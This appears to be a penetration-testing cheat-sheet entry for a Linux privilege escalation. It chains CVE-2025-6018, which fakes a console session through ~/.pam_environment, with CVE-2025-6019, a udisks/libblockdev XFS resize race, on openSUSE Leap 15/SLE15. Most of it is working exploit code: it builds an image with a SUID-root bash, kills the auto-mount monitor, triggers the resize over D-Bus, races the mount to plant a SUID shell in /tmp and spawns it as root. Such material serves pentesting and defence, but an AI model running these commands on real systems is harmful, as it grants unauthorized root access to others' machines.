---
id: linux-pam-polkit
title: Linux PAM / Polkit Privesc
stage: privesc
tags: [linux]
tools:
  - echo -e "XDG_SEAT=seat0\nXDG_VTNR=1" > ~/.pam_environment
  - pkcheck --action-id org.freedesktop.udisks2.loop-setup --process $$
  - udisksctl loop-setup -f payload.img
leads_to:
  - root-linux
---

## CVE-2025-6018: Fake an `allow_active` Session (openSUSE/SLE15 PAM)

udisks/polkit actions that grant real privilege (loop-device setup, filesystem resize) normally require an `allow_active` session — i.e. a physical console login. A remote SSH session doesn't qualify. openSUSE 15's PAM stack reads `~/.pam_environment` on session creation and trusts `XDG_SEAT`/`XDG_VTNR` from it, so a normal user can fake a console session:

```bash
echo -e "XDG_SEAT=seat0\nXDG_VTNR=1" > ~/.pam_environment
# log out and back in — .pam_environment is only read at session creation
```

Confirm polkit now treats the session as `allow_active`:

```bash
pkcheck --action-id org.freedesktop.udisks2.loop-setup --process $$ && echo POLKIT_OK
```

## CVE-2025-6019: udisks/libblockdev XFS-Resize Race → SUID Root

When udisks asks libblockdev to resize an XFS filesystem, libblockdev mounts it internally at `/tmp/blockdev.XXXXXX` to run the resize tooling — and that internal mount does **not** carry udisks's `nosuid,nodev` flags. For the duration of the resize, the filesystem is live with full SUID semantics.

```bash
# Build a > 512MB XFS image containing an SUID-root bash (build on attacker host,
# using a bash binary copied FROM the target — glibc/libtinfo mismatches segfault otherwise)
dd if=/dev/zero of=payload.img bs=1M count=512
mkfs.xfs -f payload.img
sudo mkdir -p /mnt/xfs && sudo mount -o loop payload.img /mnt/xfs
sudo cp bash /mnt/xfs/rootbash && sudo chown root:root /mnt/xfs/rootbash
sudo chmod 6755 /mnt/xfs/rootbash
sudo umount /mnt/xfs

# Transfer payload.img to the target, then:
killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null   # stop auto-mount from beating you to it
udisksctl loop-setup -f /tmp/payload.img

# Trigger the resize (this is the window where /tmp/blockdev.* is briefly suid-live)
gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'

# Race the window — copy the SUID bash out before it unmounts
while true; do
  for d in /tmp/blockdev.*; do
    [ -x "$d/rootbash" ] && "$d/rootbash" -p -c \
      'cp /bin/bash /tmp/pwned; chmod 4755 /tmp/pwned' 2>/dev/null && break 2
  done
done

/tmp/pwned -p
```

## Notes

CVE-2025-6018 and CVE-2025-6019 are two separate bugs that chain together: 6018 gets you the `allow_active` polkit session the udisks actions require; 6019 is the actual privilege boundary break. Affects openSUSE Leap 15 / SLE15. Check `/etc/os-release` for the distro/version before assuming this applies. Kill `gvfs-udisks2-volume-monitor` first — if it auto-mounts the loop device, the resize will refuse to run against a filesystem mounted elsewhere.
